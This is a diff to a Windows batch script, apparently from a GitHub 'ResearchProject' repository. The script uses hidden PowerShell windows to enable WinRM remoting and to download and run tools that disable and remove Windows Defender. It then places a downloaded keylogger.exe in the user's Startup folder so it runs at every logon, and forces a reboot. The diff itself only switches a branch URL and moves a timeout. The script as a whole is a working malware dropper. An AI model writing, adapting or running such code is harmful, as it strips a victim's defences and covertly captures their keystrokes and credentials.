@@ -29,7 +29,7 @@ cd /d "%~dp0"
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
     "try { winrm quickconfig -quiet; Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop } catch { Write-Output 'WinRM already configured or failed'; Start-Sleep -Seconds 3 }"
 
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1' -OutFile disableWinDef.ps1"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/Gabriel/Original/Resources/disableWinDef.ps1' -OutFile disableWinDef.ps1"
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "disableWinDef.ps1"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/installer.ps1' -OutFile installer.ps1"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe' -OutFile defender_remover.exe"
@@ -38,11 +38,10 @@ defender_remover.exe Y
 
 @REM Download and execute keylogger
 
-timeout /t 60
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/Gabriel/Original/Resources/keylogger.exe' -OutFile 'C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe'"
 
-@REM Schedule reboot in 1 minute
+timeout /t 60
 
 shutdown /r
 
